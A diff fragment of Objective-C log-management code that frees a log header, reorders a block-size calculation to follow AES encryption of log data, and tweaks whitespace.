@@ -456,6 +456,8 @@ typedef struct _log {
               return FALSE;
             }
             
+          [logHeader release];
+          
           NSMutableArray *theQueue = [self getLogQueue:agentID];
           
           @synchronized(theQueue) 
@@ -513,22 +515,22 @@ typedef struct _log {
     return dataWrited;
     
   encData = [[NSMutableData alloc] initWithData: aData];
-    
-  int _blockSize = [encData length];
-  
-  NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
-                                     length: sizeof(int)];
                                      
   NSData *temp = [NSData dataWithBytes: gLogAesKey
                                 length: CC_MD5_DIGEST_LENGTH];
   
-  result = [encData encryptWithKey: temp];
+  result = [encData encryptWithKey:temp];
   
   if (result != kCCSuccess)
     {
       [encData release];
       return dataWrited;
-    }    
+    }   
+    
+  int _blockSize = [encData length];
+  
+  NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
+                                     length: sizeof(int)];
               
   NSMutableArray *theQueue = [self getLogQueue:agentID];
                                                                                                                 
@@ -773,6 +775,7 @@ typedef struct _log {
       
       [self closeActiveLog: shMemLog->agentID
                  withLogID: shMemLog->logID];
+
       break;
     }
     default:
